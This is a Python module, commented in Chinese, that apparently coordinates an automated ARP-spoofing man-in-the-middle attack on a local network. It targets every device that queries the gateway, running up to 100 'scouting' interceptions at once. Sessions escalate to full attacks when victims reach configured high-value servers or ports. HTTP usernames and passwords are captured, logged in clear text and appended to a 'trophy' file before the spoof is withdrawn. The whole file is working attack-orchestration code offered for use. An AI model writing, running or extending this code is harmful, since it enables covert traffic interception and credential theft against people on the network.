"""
攻击协调器
==========
根据数据包分析结果制定攻击策略，管理攻击生命周期
"""

import logging
import time
import threading
from dataclasses import dataclass
from typing import Optional, Callable, Dict, Any, Set
from state_cache import StateCache

@dataclass
class AttackDecision:
    """攻击决策"""
    action: str  # 'attack', 'restore', 'ignore'
    target_ip: str
    gateway_ip: str = ""
    target_mac: str = ""
    gateway_mac: str = ""
    duration: int = 45  # 攻击持续时间(秒)
    attack_type: str = "standard"  # 攻击类型
    reason: str = ""  # 决策原因

class AttackCoordinator:
    """攻击协调器"""
    
    def __init__(self, config, state_cache: StateCache):
        self.config = config
        self.state_cache = state_cache
        self.logger = logging.getLogger(__name__)
        self.command_sender = None
        
        # ★【关键修复】★ Scout和Attack分离的并发限制
        self.max_scout_attacks = getattr(config, 'max_scout_attacks', 100)      # Scout侦察最大并发数
        self.max_active_attacks = getattr(config, 'max_active_attacks', 40)     # Attack攻击最大并发数
        # 保持向后兼容
        self.max_concurrent_attacks = getattr(config, 'max_concurrent_attacks', 40)
        
        # ★【分离管理】★ 独立跟踪Scout和Attack会话
        self.active_scouts_lock = threading.Lock()
        self.active_attacks_lock = threading.Lock()
        self.active_scouts: Set[str] = set()        # 当前活跃的Scout侦察目标
        self.active_attacks: Set[str] = set()       # 当前活跃的Attack攻击目标
        
        # ★【强化去重】★ 全局凭据处理去重锁和缓存
        self._global_credentials_lock = threading.RLock()  # 可重入锁
        self._processing_credentials: Set[str] = set()  # 正在处理的凭据集合
        self._processed_credentials: Set[str] = set()   # 已处理的凭据集合
        self._last_cleanup = time.time()  # 上次清理时间
        
        # ★【新增】★ ARP 恢复去重
        self._arp_restore_lock = threading.Lock()
        self._restoring_targets: Set[str] = set()  # 正在恢复的目标集合
        
        # ★【新增】★ 决策去重机制 - 避免多线程重复决策
        self._decision_lock = threading.Lock()
        self._processing_decisions: Set[str] = set()  # 正在处理的决策集合 (format: "action:target_ip")
        
        # 统计信息
        self.stats = {
            'decisions_made': 0,
            'scouts_authorized': 0,           # ★【新增】★ Scout授权统计
            'attacks_authorized': 0,          # Attack授权统计
            'scouts_blocked': 0,              # ★【新增】★ Scout阻止统计
            'attacks_blocked': 0,             # Attack阻止统计
            'scout_to_attack_upgrades': 0,    # ★【新增】★ Scout升级为Attack统计
            'restores_initiated': 0,
            'credentials_deduplicated': 0,    # 去重统计
            'arp_restore_deduplicated': 0,    # ARP恢复去重统计
            'decisions_deduplicated': 0       # 决策去重统计
        }
        self.stats_lock = threading.Lock()
        
    def initialize(self, command_sender: Callable) -> bool:
        """初始化协调器"""
        self.command_sender = command_sender
        self.logger.info("Attack coordinator initialized")
        
        # ★【新增】★ 启动定期清理线程
        self._start_cleanup_thread()
        
        return True
    
    def _start_cleanup_thread(self):
        """启动定期清理线程，防止内存泄漏"""
        def cleanup_worker():
            while True:
                try:
                    time.sleep(30)  # ★【优化】★ 改为每30秒清理一次，更及时
                    
                    current_time = time.time()
                    
                    # ★【新增】★ 清理过期的Scout和Attack会话
                    self.cleanup_expired_sessions()
                    
                    # 清理决策处理集合
                    with self._decision_lock:
                        # 简单粗暴的定期清空，因为决策处理通常很快
                        if len(self._processing_decisions) > 100:  # 如果积累太多可能是有问题
                            self._processing_decisions.clear()
                            self.logger.info("🧹 Cleared decision processing cache")
                    
                    # 清理已处理凭据集合
                    with self._global_credentials_lock:
                        if current_time - self._last_cleanup > 300:  # 5分钟清理一次
                            self._processed_credentials.clear()
                            self._last_cleanup = current_time
                            self.logger.debug("🧹 Cleared processed credentials cache")
                    
                    # 清理ARP恢复集合（这个应该自动清理，但防止内存泄漏）
                    with self._arp_restore_lock:
                        if len(self._restoring_targets) > 50:  # 如果积累太多
                            self._restoring_targets.clear()
                            self.logger.info("🧹 Cleared ARP restore tracking cache")
                    
                    # ★【新增】★ 每5分钟输出会话统计
                    if not hasattr(self, '_last_stats_log') or current_time - self._last_stats_log > 300:
                        stats = self.get_session_stats()
                        self.logger.info(f"📊 Session Stats: Scout {stats['active_scouts']}/{stats['max_scout_attacks']} ({stats['scout_utilization']:.1f}%), Attack {stats['active_attacks']}/{stats['max_active_attacks']} ({stats['attack_utilization']:.1f}%)")
                        self._last_stats_log = current_time
                    
                except Exception as e:
                    self.logger.error(f"Cleanup thread error: {e}")
        
        cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True, name="CoordinatorCleanup")
        cleanup_thread.start()
        self.logger.info("🧹 Started coordinator cleanup thread with session management")
        
        return True
        
    def make_decision(self, analysis_result) -> Optional[AttackDecision]:
        """根据分析结果制定攻击决策 - 强化去重版本"""
        # ★【新增】★ 构建决策键，避免重复决策
        target_ip = analysis_result.source_ip
        decision_key = f"{analysis_result.packet_type}:{target_ip}"
        
        # ★【决策级去重】★ 检查是否已有线程在处理相同的决策
        with self._decision_lock:
            if decision_key in self._processing_decisions:
                with self.stats_lock:
                    self.stats['decisions_deduplicated'] += 1
                self.logger.debug(f"🚫 Decision for {decision_key} already in progress, skipping")
                return None
            
            # 标记为正在处理
            self._processing_decisions.add(decision_key)
        
        try:
            with self.stats_lock:
                self.stats['decisions_made'] += 1
                
            # 执行实际决策逻辑
            if analysis_result.packet_type == 'arp':
                result = self._handle_arp_analysis(analysis_result)
            elif analysis_result.packet_type == 'http':
                result = self._handle_http_analysis(analysis_result)
            else:
                result = None
            
            return result
                
        except Exception as e:
            self.logger.error(f"Decision making error: {e}")
            return None
        finally:
            # ★【重要】★ 无论成功失败都要移除决策标记
            with self._decision_lock:
                self._processing_decisions.discard(decision_key)
    
    def _handle_arp_analysis(self, analysis) -> Optional[AttackDecision]:
        """处理ARP分析结果 - 发起侦察窗口 (Scout模式)"""
        if not analysis.gateway_query:
            return None
            
        target_ip = analysis.source_ip
        
        # ★【分离管理1】★ 检查Scout并发限制
        with self.active_scouts_lock:
            if len(self.active_scouts) >= self.max_scout_attacks:
                with self.stats_lock:
                    self.stats['scouts_blocked'] += 1
                self.logger.debug(f"Scout blocked for {target_ip} (max scout limit {self.max_scout_attacks} reached)")
                return AttackDecision(
                    action='ignore',
                    target_ip=target_ip,
                    reason='scout_limit_reached'
                )
        
        # 检查是否应该攻击此目标
        if not self.state_cache.should_attack_target(target_ip):
            with self.stats_lock:
                self.stats['scouts_blocked'] += 1
                
            self.logger.debug(f"Scout blocked for {target_ip} (cache hit or active session)")
            return AttackDecision(
                action='ignore',
                target_ip=target_ip,
                reason='blocked_by_cache'
            )
        
        # ★【分离管理2】★ 注册Scout会话
        with self.active_scouts_lock:
            self.active_scouts.add(target_ip)
        
        # ★【核心修改】★ 启动侦察窗口，而非全面攻击
        with self.stats_lock:
            self.stats['scouts_authorized'] += 1
            
        # 获取目标MAC (从缓存或分析结果)
        target_mac = analysis.metadata.get('src_mac', '')
        if not target_mac:
            target_mac = self.state_cache.get_cached_mac(target_ip) or ''
        
        # ★【新策略】★ 创建侦察模式的攻击决策
        decision = AttackDecision(
            action='attack',
            target_ip=target_ip,
            gateway_ip=self.config.network.gateway_ip,
            target_mac=target_mac,
            gateway_mac='',  # 将在执行时获取
            duration=self.config.attack.strategy.scouting_duration,  # 使用侦察持续时间
            attack_type='scouting',  # 侦察模式
            reason='arp_gateway_query_for_scouting'
        )
        
        # 开始侦察会话跟踪
        self.state_cache.start_attack_session(
            target_ip, 
            decision.duration, 
            decision.attack_type
        )
        
        self.logger.info(f"🔍 New device {target_ip} detected. Initiating {decision.duration}s 'scouting' MiTM (Scout {len(self.active_scouts)}/{self.max_scout_attacks}).")
        return decision
    
    def _handle_http_analysis(self, analysis) -> Optional[AttackDecision]:
        """处理HTTP分析结果 - 价值判断与攻击升级"""
        target_ip = analysis.source_ip
        
        # 获取目标和端口信息
        dst_ip = analysis.metadata.get('dst_ip', '')
        dst_port = analysis.metadata.get('dst_port', 0)
        
        # ★【核心逻辑1】★ 检查是否为高价值事件
        is_high_value_event = self._is_high_value_event(dst_ip, dst_port)
        
        # ★【核心逻辑2】★ 获取当前攻击状态
        current_attack_info = self.state_cache.get_attack_info(target_ip)
        
        # ★【核心逻辑3】★ 如果处于侦察模式，且触发高价值事件，则升级攻击
        if (is_high_value_event and 
            current_attack_info and 
            current_attack_info['attack_type'] == 'scouting' and 
            self.config.attack.strategy.auto_upgrade_on_high_value):
            
            # ★【分离管理3】★ 检查Attack并发限制
            with self.active_attacks_lock:
                if len(self.active_attacks) >= self.max_active_attacks:
                    with self.stats_lock:
                        self.stats['attacks_blocked'] += 1
                    self.logger.warning(f"Cannot upgrade {target_ip} to Attack: max attack limit {self.max_active_attacks} reached")
                    return AttackDecision(
                        action='ignore',
                        target_ip=target_ip,
                        reason='attack_limit_reached'
                    )
                
                # 注册Attack会话
                self.active_attacks.add(target_ip)
            
            # ★【分离管理4】★ 从Scout列表移除，避免重复计数
            with self.active_scouts_lock:
                self.active_scouts.discard(target_ip)
            
            with self.stats_lock:
                self.stats['scout_to_attack_upgrades'] += 1
            
            self.logger.info(f"🎯 High-value event from {target_ip} (port {dst_port})! Upgrading to full attack for {self.config.attack.strategy.full_attack_duration}s (Attack {len(self.active_attacks)}/{self.max_active_attacks}).")
            
            # 升级攻击会话
            self.state_cache.upgrade_attack_session(
                target_ip, 
                self.config.attack.strategy.full_attack_duration, 
                'full_attack'
            )
            
            # 发送攻击升级指令
            return AttackDecision(
                action='attack',
                target_ip=target_ip,
                gateway_ip=self.config.network.gateway_ip,
                duration=self.config.attack.strategy.full_attack_duration,
                attack_type='full_attack',
                reason='high_value_event_detected'
            )
        
        # ★【核心逻辑4】★ 凭据捕获处理（无论在哪种攻击模式下）
        if analysis.http_credentials:
            self.logger.info(f"🏆 Credentials captured from {target_ip}: "
                           f"{analysis.http_credentials['username']}:"
                           f"{analysis.http_credentials['password']}")
            
            # 保存凭据到文件
            self._save_credentials(target_ip, analysis.http_credentials, analysis.metadata)
            
            # ★【分离管理5】★ 清理会话跟踪
            self._cleanup_session_tracking(target_ip)
            
            # 标记攻击成功
            self.state_cache.end_attack_session(target_ip, success=True)
            
            # 立即恢复网络
            return AttackDecision(
                action='restore',
                target_ip=target_ip,
                gateway_ip=self.config.network.gateway_ip,
                reason='credentials_captured'
            )
        
        # ★【核心逻辑5】★ 普通HTTP流量，记录但不做决策
        return AttackDecision(
            action='ignore',
            target_ip=target_ip,
            reason='http_traffic_logged'
        )
    
    def _is_high_value_event(self, dst_ip: str, dst_port: int) -> bool:
        """判断是否为高价值事件"""
        # 检查是否访问目标服务器
        if dst_ip == self.config.network.target_server:
            self.logger.debug(f"High-value server access detected: {dst_ip}")
            return True
        
        # 检查是否访问高价值端口
        if dst_port in self.config.attack.strategy.high_value_ports:
            self.logger.debug(f"High-value port access detected: {dst_port}")
            return True
        
        # ★【扩展】★ 检查其他高价值模式
        # 例如：特定域名、特定URL路径等
        # 这里可以根据实际需求扩展
            
        return False
    
    def _cleanup_session_tracking(self, target_ip: str):
        """清理会话跟踪信息"""
        # 从Scout列表移除
        with self.active_scouts_lock:
            self.active_scouts.discard(target_ip)
        
        # 从Attack列表移除
        with self.active_attacks_lock:
            self.active_attacks.discard(target_ip)
    
    def cleanup_expired_sessions(self):
        """定期清理过期会话 - 新增方法"""
        current_time = time.time()
        expired_scouts = []
        expired_attacks = []
        
        # 检查Scout会话
        with self.active_scouts_lock:
            for target_ip in list(self.active_scouts):
                attack_info = self.state_cache.get_attack_info(target_ip)
                if not attack_info or attack_info.get('expired', False):
                    expired_scouts.append(target_ip)
        
        # 检查Attack会话
        with self.active_attacks_lock:
            for target_ip in list(self.active_attacks):
                attack_info = self.state_cache.get_attack_info(target_ip)
                if not attack_info or attack_info.get('expired', False):
                    expired_attacks.append(target_ip)
        
        # 清理过期的Scout会话
        if expired_scouts:
            with self.active_scouts_lock:
                for target_ip in expired_scouts:
                    self.active_scouts.discard(target_ip)
            self.logger.info(f"🧹 Cleaned {len(expired_scouts)} expired Scout sessions")
        
        # 清理过期的Attack会话
        if expired_attacks:
            with self.active_attacks_lock:
                for target_ip in expired_attacks:
                    self.active_attacks.discard(target_ip)
            self.logger.info(f"🧹 Cleaned {len(expired_attacks)} expired Attack sessions")
    
    def get_session_stats(self) -> Dict[str, int]:
        """获取会话统计信息"""
        with self.active_scouts_lock, self.active_attacks_lock:
            return {
                'active_scouts': len(self.active_scouts),
                'active_attacks': len(self.active_attacks),
                'max_scout_attacks': self.max_scout_attacks,
                'max_active_attacks': self.max_active_attacks,
                'scout_utilization': len(self.active_scouts) / self.max_scout_attacks * 100,
                'attack_utilization': len(self.active_attacks) / self.max_active_attacks * 100
            }
    
    def _save_credentials(self, source_ip: str, credentials: Dict[str, str], metadata: Dict):
        """保存捕获的凭据并触发立即撤离 - 强化去重版本"""
        username = credentials.get('username', '')
        password = credentials.get('password', '')
        credential_key = f"{source_ip}:{username}:{password}"
        
        # ★【第一层】★ 快速检查 - 避免重复计算
        with self._global_credentials_lock:
            # 定期清理已处理集合，避免内存泄漏
            current_time = time.time()
            if current_time - self._last_cleanup > 300:  # 5分钟清理一次
                self._processed_credentials.clear()
                self._last_cleanup = current_time
                self.logger.debug("🧹 Cleared processed credentials cache")
            
            # 检查是否已经处理过
            if credential_key in self._processed_credentials:
                with self.stats_lock:
                    self.stats['credentials_deduplicated'] += 1
                self.logger.debug(f"🚫 Credentials {credential_key} already processed globally, skipping")
                return
            
            # 检查是否正在处理中
            if credential_key in self._processing_credentials:
                with self.stats_lock:
                    self.stats['credentials_deduplicated'] += 1
                self.logger.debug(f"🚫 Credentials {credential_key} currently being processed, skipping")
                return
            
            # 标记为正在处理
            self._processing_credentials.add(credential_key)
        
        try:
            # ★【第二层】★ 状态缓存检查
            if self.state_cache.has_credentials_saved(credential_key):
                self.logger.debug(f"🚫 Credentials for {credential_key} already in state cache, skipping")
                return
            
            # ★【第三层】★ 文件级别检查（可选，性能考虑可移除）
            # 这里可以加入文件去重检查，但考虑到性能，先跳过
            
            # 执行实际保存
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            log_entry = f"{source_ip},{username},{password},{timestamp}\n"
            
            trophy_file = "temporary.txt"
            with open(trophy_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
            
            # 标记为已保存
            self.state_cache.mark_credentials_saved(credential_key)
            
            # 添加到已处理集合
            with self._global_credentials_lock:
                self._processed_credentials.add(credential_key)
            
            self.logger.info(f"🏆 Credentials captured from {source_ip}: {username}:{password}")
            self.logger.info(f"🏆 Credentials saved to {trophy_file}: {username}@{source_ip}")
            
            # ★【强化ARP恢复去重】★ 发送立即停止攻击命令
            self._trigger_immediate_withdrawal(source_ip)
            
        except Exception as e:
            self.logger.error(f"Failed to save credentials: {e}")
        finally:
            # ★【重要】★ 无论成功失败都要从处理中集合移除
            with self._global_credentials_lock:
                self._processing_credentials.discard(credential_key)
    
    def _trigger_immediate_withdrawal(self, source_ip: str):
        """触发立即撤离 - 带ARP恢复去重"""
        with self._arp_restore_lock:
            if source_ip in self._restoring_targets:
                with self.stats_lock:
                    self.stats['arp_restore_deduplicated'] += 1
                self.logger.debug(f"🚫 ARP restore for {source_ip} already in progress, skipping")
                return
            
            # 标记为正在恢复
            self._restoring_targets.add(source_ip)
        
        try:
            stop_command = {
                'type': 'STOP_SPOOF',
                'target_ip': source_ip,
                'reason': 'credentials_captured'
            }
            
            if self.command_sender:
                self.command_sender(stop_command)
                self.logger.info(f"⚡ Immediate withdrawal triggered for {source_ip} - credentials captured!")
                self.logger.info(f"Restoring ARP for {source_ip}")
                
                # 延迟移除恢复标记，给C++足够时间处理
                def remove_restore_flag():
                    time.sleep(2)  # 2秒后移除标记
                    with self._arp_restore_lock:
                        self._restoring_targets.discard(source_ip)
                
                threading.Thread(target=remove_restore_flag, daemon=True).start()
            else:
                # 如果没有command_sender，立即移除标记
                with self._arp_restore_lock:
                    self._restoring_targets.discard(source_ip)
                    
        except Exception as e:
            self.logger.error(f"Failed to trigger withdrawal for {source_ip}: {e}")
            # 发生错误时移除标记
            with self._arp_restore_lock:
                self._restoring_targets.discard(source_ip)
    
    def get_statistics(self) -> Dict[str, Any]:
        """获取协调器统计信息"""
        with self.stats_lock:
            stats = dict(self.stats)
        
        # 添加状态缓存统计
        cache_stats = self.state_cache.get_statistics()
        stats.update({
            'cache_' + k: v for k, v in cache_stats.items()
        })
        
        return stats
    
    def register_active_attack(self, target_ip: str, duration: int) -> bool:
        """★【新增】★ 注册活跃攻击，返回是否成功"""
        with self.active_attacks_lock:
            if len(self.active_attacks) >= self.max_concurrent_attacks:
                self.logger.warning(f"🚫 Cannot register attack on {target_ip}: max concurrent attacks ({self.max_concurrent_attacks}) reached")
                return False
            
            if target_ip in self.active_attacks:
                self.logger.debug(f"🚫 Attack on {target_ip} already active")
                return False
            
            self.active_attacks.add(target_ip)
            self.logger.info(f"✅ Registered active attack on {target_ip} (active: {len(self.active_attacks)}/{self.max_concurrent_attacks})")
            
            # ★【关键】★ 设置定时器自动清理
            def cleanup_attack():
                with self.active_attacks_lock:
                    if target_ip in self.active_attacks:
                        self.active_attacks.remove(target_ip)
                        self.logger.info(f"🕐 Auto-removed active attack on {target_ip} after {duration}s (active: {len(self.active_attacks)}/{self.max_concurrent_attacks})")
            
            # 启动清理定时器
            cleanup_timer = threading.Timer(duration + 5, cleanup_attack)  # 额外5秒缓冲
            cleanup_timer.daemon = True
            cleanup_timer.start()
            
            return True
    
    def unregister_active_attack(self, target_ip: str):
        """★【新增】★ 手动注销活跃攻击"""
        with self.active_attacks_lock:
            if target_ip in self.active_attacks:
                self.active_attacks.remove(target_ip)
                self.logger.info(f"✅ Manually removed active attack on {target_ip} (active: {len(self.active_attacks)}/{self.max_concurrent_attacks})")
    
    def get_active_attacks_count(self) -> int:
        """★【新增】★ 获取当前活跃攻击数量"""
        with self.active_attacks_lock:
            return len(self.active_attacks)
